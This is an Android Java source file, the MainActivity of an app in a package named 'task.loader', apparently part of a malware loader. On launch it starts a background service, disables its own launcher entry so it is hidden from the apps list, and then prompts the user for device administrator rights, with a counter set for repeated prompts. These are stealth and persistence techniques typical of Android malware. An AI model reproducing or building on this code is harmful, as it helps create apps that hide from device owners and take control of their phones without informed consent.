package task.loader;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;

import android.os.Bundle;

import task.loader.admin.Admin;

public class MainActivity extends Activity
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        startService(new Intent(this, MainService.class));

        try // hide from apps list
        {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
        catch (Exception ex) {
        }

        if(Settings.isBlock(this))
            return;

        Settings settings = new Settings(this);
        if(settings.isFisrt())
        {
            settings.setAdminRequestCount(Constants.ADMIN_REQUEST_COUNT);
        }

        // ask for admin rights
        Admin.startAdminActivity(this);
        finish();
    }


}
